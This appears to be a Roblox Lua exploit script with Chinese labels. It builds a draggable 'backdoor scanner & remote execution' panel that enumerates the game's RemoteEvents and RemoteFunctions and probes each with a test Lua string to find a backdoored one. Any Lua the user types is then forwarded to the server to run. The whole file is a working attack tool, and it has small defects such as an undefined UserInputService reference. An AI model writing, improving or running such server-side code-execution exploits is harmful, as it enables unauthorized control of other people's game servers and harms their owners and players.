-- 服务
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
local JointsService = game:GetService("JointsService")

local LocalPlayer = Players.LocalPlayer

-- UI界面创建（可拖动、输入、状态提示）
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "后门扫描器"
ScreenGui.Parent = CoreGui
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 420, 0, 280)
MainFrame.Position = UDim2.new(0.5, -210, 0.5, -140)
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 50, 80)
MainFrame.Parent = ScreenGui
MainFrame.Active = true
MainFrame.Draggable = true

local UICorner = Instance.new("UICorner", MainFrame)
UICorner.CornerRadius = UDim.new(0, 18)

local Title = Instance.new("TextLabel", MainFrame)
Title.Size = UDim2.new(1, 0, 0, 38)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.Text = "后门扫描器 & 远程执行"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.Fondamento
Title.TextSize = 22

local Status = Instance.new("TextLabel", MainFrame)
Status.Size = UDim2.new(1, -20, 0, 26)
Status.Position = UDim2.new(0, 10, 0, 44)
Status.Text = "状态：未扫描"
Status.TextColor3 = Color3.fromRGB(200, 255, 200)
Status.BackgroundTransparency = 1
Status.Font = Enum.Font.Fondamento
Status.TextSize = 15

local InputBox = Instance.new("TextBox", MainFrame)
InputBox.Size = UDim2.new(0.95, 0, 0, 80)
InputBox.Position = UDim2.new(0.025, 0, 0, 74)
InputBox.PlaceholderText = "在此输入要远程执行的Lua代码"
InputBox.Text = ""
InputBox.BackgroundColor3 = Color3.fromRGB(50, 70, 120)
InputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
InputBox.Font = Enum.Font.Fondamento
InputBox.TextSize = 16
InputBox.ClearTextOnFocus = false

local ScanBtn = Instance.new("TextButton", MainFrame)
ScanBtn.Size = UDim2.new(0.45, 0, 0, 36)
ScanBtn.Position = UDim2.new(0.05, 0, 0, 170)
ScanBtn.Text = "扫描后门"
ScanBtn.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
ScanBtn.TextColor3 = Color3.fromRGB(0,0,0)
ScanBtn.Font = Enum.Font.Fondamento
ScanBtn.TextSize = 17

local ExecuteBtn = Instance.new("TextButton", MainFrame)
ExecuteBtn.Size = UDim2.new(0.45, 0, 0, 36)
ExecuteBtn.Position = UDim2.new(0.5, 0, 0, 170)
ExecuteBtn.Text = "执行代码"
ExecuteBtn.BackgroundColor3 = Color3.fromRGB(120, 170, 255)
ExecuteBtn.TextColor3 = Color3.fromRGB(0,0,0)
ExecuteBtn.Font = Enum.Font.Fondamento
ExecuteBtn.TextSize = 17

local FoundRemotes = {}   -- 远程事件列表
local attached = false
local backdoor = nil

-- 远程事件过滤与检测
local function validRemote(rm)
    local ok, class = pcall(function() return rm.ClassName end)
    if not ok then return false end
    if class ~= "RemoteEvent" and class ~= "RemoteFunction" then return false end
    local p = rm.Parent
    if p == JointsService then return false end
    if p == ReplicatedStorage and rm:FindFirstChild("__FUNCTION") then return false end
    if rm.Name == "__FUNCTION" then return false end
    if rm:IsDescendantOf(RobloxReplicatedStorage) then return false end
    return true
end

-- 多线程递归扫描所有远程事件
local function scanAllRemotes()
    FoundRemotes = {}
    Status.Text = "状态：正在扫描（多线程）..."
    local scanned = 0
    local found = 0

    local candidates = {}

    -- 获取所有可用根节点
    for _, obj in ipairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            table.insert(candidates, obj)
        end
    end

    -- 多线程验证所有远程事件
    local threads = {}
    for _, remote in ipairs(candidates) do
        table.insert(threads, task.spawn(function()
            scanned = scanned + 1
            if validRemote(remote) then
                found = found + 1
                table.insert(FoundRemotes, remote)
            end
        end))
    end

    repeat
        Status.Text = string.format("状态：已扫描%d个，发现%d个远程", scanned, found)
        task.wait(0.2)
    until scanned == #candidates

    Status.Text = "状态：扫描完成，找到"..found.."个可疑远程"
    return #FoundRemotes > 0
end

-- 后门利用检测
local function tryAttach()
    attached = false
    backdoor = nil
    for _, remote in ipairs(FoundRemotes) do
        local success, result = pcall(function()
            if remote.ClassName == "RemoteEvent" then
                remote:FireServer("print('test')")
            elseif remote.ClassName == "RemoteFunction" then
                remote:InvokeServer("print('test')")
            end
        end)
        if success then
            attached = true
            backdoor = remote
            break
        end
    end
    if attached then
        Status.Text = ("状态：已连接后门 ["..backdoor.Name.."]")
        return true
    else
        Status.Text = "状态：未发现可利用后门"
        return false
    end
end

-- 代码执行
local function executeScript(script)
    if not attached or not backdoor then
        Status.Text = "状态：未连接后门，无法执行"
        return
    end
    local toRun = script or InputBox.Text
    if not toRun or toRun == "" then
        Status.Text = "状态：请输入要执行的代码"
        return
    end
    local ok, err = pcall(function()
        if backdoor.ClassName == "RemoteEvent" then
            backdoor:FireServer(toRun)
        elseif backdoor.ClassName == "RemoteFunction" then
            backdoor:InvokeServer(toRun)
        end
    end)
    if ok then
        Status.Text = "状态：代码已发送"
    else
        Status.Text = "状态：代码执行失败："..tostring(err)
    end
end

-- 按钮绑定
ScanBtn.MouseButton1Click:Connect(function()
    local ok = scanAllRemotes()
    if ok then
        if tryAttach() then
            Status.Text = "状态：已连接后门，可执行代码"
        else
            Status.Text = "状态：未发现可用后门"
        end
    else
        Status.Text = "状态：未发现任何远程事件"
    end
end)

ExecuteBtn.MouseButton1Click:Connect(function()
    executeScript(InputBox.Text)
end)

-- 拖动优化（已用Draggable，保留备用）
local dragging, dragInput, dragStart, startPos
MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)
MainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

-- 初始状态
Status.Text = "状态：未扫描"